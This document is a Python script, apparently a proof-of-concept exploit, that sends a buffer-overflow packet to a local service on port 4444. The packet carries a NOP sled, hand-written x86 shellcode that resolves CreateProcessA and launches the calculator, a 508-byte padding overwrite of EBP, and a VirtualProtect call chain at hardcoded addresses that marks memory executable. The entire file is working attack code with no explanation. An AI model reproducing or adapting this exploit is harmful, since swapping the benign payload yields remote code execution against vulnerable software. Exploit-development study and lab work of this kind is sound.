import socket
import struct

payload = b"\x90" * 0x10
payload += b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
payload += b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
payload += b"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
payload += b"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
payload += b"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
payload += b"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
payload += b"\x45\x81\x3e\x43\x72\x65\x61\x75"
payload += b"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
payload += b"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
payload += b"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
payload += b"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
payload += b"\xb1\x0d\x53\xe2\xfd\x68\x63\x61"
payload += b"\x6c\x63\x89\xe2\x52\x52\x53\x53"
payload += b"\x53\x53\x53\x53\x52\x53\xff\xd7"

addr_virtual_protect = struct.pack('<L', 0x76886B30)
addr_shellcode = struct.pack('<L', 0x001AEB78)
lp_address = addr_shellcode
dw_size = struct.pack('<L', 0x1000)
fl_new_protect = struct.pack('<L', 0x40)  # 0x40 is PAGE_EXECUTE_READWRITE (RWX)
lpfl_old_protect = struct.pack('<L', 0x001AEB28)

rop_chain = (
    addr_virtual_protect +
    addr_shellcode +
    lp_address +
    dw_size +
    fl_new_protect +
    lpfl_old_protect
)

host = socket.gethostname()
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

ebp = struct.pack('<L', 0x10203040)
packet = payload + b"A" * (508 - len(payload)) + ebp + rop_chain
shell = struct.pack('<L', len(packet)) + packet

s.sendall(shell)
s.close()
